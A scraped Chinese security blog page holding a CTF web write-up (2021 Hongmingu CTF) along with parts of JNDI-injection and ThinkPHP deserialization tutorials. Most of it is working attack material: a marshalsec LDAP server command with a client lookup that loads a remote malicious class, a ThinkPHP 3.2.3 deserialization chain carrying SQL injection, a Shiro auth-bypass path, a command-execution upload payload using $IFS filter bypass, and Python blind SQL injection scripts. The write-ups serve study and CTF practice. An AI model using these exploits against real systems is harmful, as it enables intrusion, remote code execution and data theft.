<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;#ExecTest</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607a7130023a8.jpg"></p>
<p>跟之前一样开启http服务并把恶意类class文件复制到目录下</p>
<p><img src="https://www.hualigs.cn/image/607a71307a7c9.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607a71305d929.jpg"></p>
<p>CLIENT.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> InitialContext().lookup(<span class="string">&quot;ldap://192.168.111.129:1389/ExecTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行成功</p>
<p><img src="https://www.hualigs.cn/image/607a71316d72c.jpg"></p>
<h1 id="绕过高版本限制"><a href="#绕过高版本限制" class="headerlink" title="绕过高版本限制"></a>绕过高版本限制</h1><p>版本大于<code>JDK 11.0.1、8u191、7u201、6u211</code>时，之前这些利用方式都已经失效。但是仍然可以绕过</p>
<p>两种绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</span><br><span class="line"></span><br><span class="line">2.利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 </span><br></pre></td></tr></table></figure>

<p>主要依靠受害者本地<code>CLASSPATH</code>中的类，需要利用受害者本地的<code>Gadget</code>进行攻击。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/">https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6633">https://xz.aliyun.com/t/6633</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221917#h3-2">https://www.anquanke.com/post/id/221917#h3-2</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-16T12:35:38.000Z" title="2021-04-16T12:35:38.000Z">2021-04-16</time>发表</span><span class="level-item"><time dateTime="2021-04-16T12:42:34.128Z" title="2021-04-16T12:42:34.128Z">2021-04-16</time>更新</span><span class="level-item">8 分钟读完 (大约1206个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">2021红明谷ctf web部分复现</a></h1><div class="content"><h1 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h1><p>报错得到thinkphp版本为3.2.3</p>
<p><img src="https://www.hualigs.cn/image/607984ad62c03.jpg"></p>
<p>存在备份文件<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="https://www.hualigs.cn/image/607984b1ae704.jpg"></p>
<p>控制器中存在unserialize函数，需要利用反序列化漏洞</p>
<p><img src="https://www.hualigs.cn/image/607984addb770.jpg"></p>
<p>Thinkphp3.2.3反序列化漏洞（注入&amp;文件读取）</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect</a></p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32)),0)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>利用后得到当前数据库为mysql，需要查询其他数据库</p>
<p><img src="https://www.hualigs.cn/image/607984b31e8ea.jpg"></p>
<p>发现test数据库</p>
<p><img src="https://www.hualigs.cn/image/607984b3bab18.jpg"></p>
<p>查询表名，发现flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;test&#39;),1,32)),0)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984b43f636.jpg"></p>
<p>查询flag，由于updatexml只能读取32位，需要分两次读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),1,32)),0)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984b433511.jpg"></p>
<p>读取后面的flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),32,32)),0)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984b2c7943.jpg"></p>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c85503e-ea45-4bfe-ac62-3f2a27998348&#125;</span><br></pre></td></tr></table></figure>



<h1 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h1><p>访问/login，发现Set-Cookie中存在remeberMe，判断是shiro框架</p>
<p><img src="https://www.hualigs.cn/image/607984b1ea813.jpg"></p>
<p>存在/json，但是需要登陆才能访问</p>
<p><img src="https://www.hualigs.cn/image/607984b0608bb.jpg"></p>
<p>利用Apache Shiro 身份验证绕过漏洞 CVE-2020-11989</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/14055275.html">https://www.cnblogs.com/backlion/p/14055275.html</a></p>
<p>输入<code>/;/json</code>，成功登陆，提示需要json字符串</p>
<p><img src="https://www.hualigs.cn/image/607984b1af091.jpg"></p>
<p>测试发现可以反序列化</p>
<p><img src="https://www.hualigs.cn/image/607984b06b2e1.jpg"></p>
<p>在vps中看到回显</p>
<p><img src="https://www.hualigs.cn/image/607984b1369ef.jpg"></p>
<p>jackson反序列化，利用工具 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
<p><img src="https://www.hualigs.cn/image/607984b1bafe3.jpg"></p>
<p>Spring利用链，直接利用工具即可</p>
<p><img src="https://www.hualigs.cn/image/607984b2acd79.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607984b1086e8.jpg"></p>
<p>成功带出flag</p>
<p><img src="https://www.hualigs.cn/image/607984b0513b6.jpg"></p>
<h1 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>反引号执行命令，空格被过滤，使用<code>$IFS</code>绕过，也可以用<code>%09</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\$IFS\$9&#x2F;&#96;?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984ad4ca06.jpg"></p>
<p>读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\$IFS\$9\&#96;echo\$IFS\$9LyF3aGF0eW91d2FudGdnZ2dnZ2c0MDEucGhw|base64\$IFS\$9-d\&#96;&#96;?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984ad5bb46.jpg"></p>
<h1 id="happsql"><a href="#happsql" class="headerlink" title="happsql"></a>happsql</h1><p>布尔盲注。可以使用<code>regexp盲注</code>和<code>exp报错盲注</code>，后面还需要用到无列名注入的知识。</p>
<p>regexp盲注，由于^被过滤，所以需要使用十六进制编码绕过，题目中过滤了information_schema，需要先读取mysql.innodb_table_stats来获得表名然后再进行无列名注入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;-,.&quot;</span>:</span><br><span class="line">    <span class="comment"># for i in string.printable:</span></span><br><span class="line">        url = <span class="string">&quot;http://eci-2ze6jljai3r428c1jf6q.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com/index.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;cache-control&#x27;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Postman-Token&#x27;</span>: <span class="string">&quot;21b59b79-a818-4fd1-a908-3112b45f9fc6&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 10.</span></span><br><span class="line">        <span class="comment"># response = requests.request(&quot;POST&quot;, url, data=&#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &#x27;admin&quot;||(select/**/version())/**/regexp/**/0x&#x27; + binascii.hexlify(</span></span><br><span class="line">        <span class="comment">#         (&quot;^&quot; + result + i).encode()).decode() + &#x27;#&#x27;, &#x27;password&#x27;: &#x27;123456&#x27;&#125;, headers=headers)</span></span><br><span class="line">        <span class="comment"># ctf,f1ag,</span></span><br><span class="line">        <span class="comment"># response = requests.request(&quot;POST&quot;, url, data=&#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &#x27;admin&quot;||(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)/**/regexp/**/0x&#x27; + binascii.hexlify(</span></span><br><span class="line">        <span class="comment">#         (&quot;^&quot; + result + i).encode()).decode() + &#x27;#&#x27;,</span></span><br><span class="line">        <span class="comment">#     &#x27;password&#x27;: &#x27;123456&#x27;&#125;, headers=headers)</span></span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x&#x27;</span> + binascii.hexlify((<span class="string">&quot;^&quot;</span> + result + i).encode()).decode() + <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">                                                       <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;, headers=headers)</span><br><span class="line">        print(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;home&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">            result += i</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>



<p>exp报错盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">string = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>]</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">chars = string.printable</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#  a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))#</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment">#&#x27;username&#x27;:&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))#&#x27;%(j,i,i), #数据库</span></span><br><span class="line">        <span class="comment"># &#x27;username&#x27;:&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/regexp/**/&quot;ctf&quot;),%d)),%d),710,1))#&#x27;%(j,i,i),#表</span></span><br><span class="line">         <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(x.2)/**/from/**/(select/**/2/**/union/**/select/**/*/**/from/**/f1ag)x),%d)),%d),710,1))#&#x27;</span>%(j,i,i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;213&#x27;</span></span><br><span class="line">       &#125;   </span><br><span class="line">        rep =  req.post(url,data)</span><br><span class="line">        text = rep.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;home.php&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">            result += j</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">           </span><br></pre></td></tr></table></figure>



<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/48/">http://www.yang99.top/index.php/archives/48/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6859.html">https://www.zhaoj.in/read-6859.html</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg">https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-15T06:02:06.000Z" title="2021-04-15T06:02:06.000Z">2021-04-15</time>发表</span><span class="level-item"><time dateTime="2021-04-15T06:13:28.013Z" title="2021-04-15T06:13:28.013Z">2021-04-15</time>更新</span><span class="level-item">10 分钟读完 (大约1471个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/">thinkphp 5.1.x 反序列化漏洞分析.md</a></h1><div class="content"><h1 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</span><br></pre></td></tr></table></figure>

<p>存在<code>__destruct()</code>方法</p>
<p><img src="https://ae01.alicdn.com/kf/Ue153544e99674753b354a81fa2d37f22w.jpg"></p>
<p>跟进removeFiles()，file_exists在处理filename时会当成字符串处理，只要让构造<code>$this-&gt;files</code>为包含类的数组就可以调用<code>__toString()</code></p>
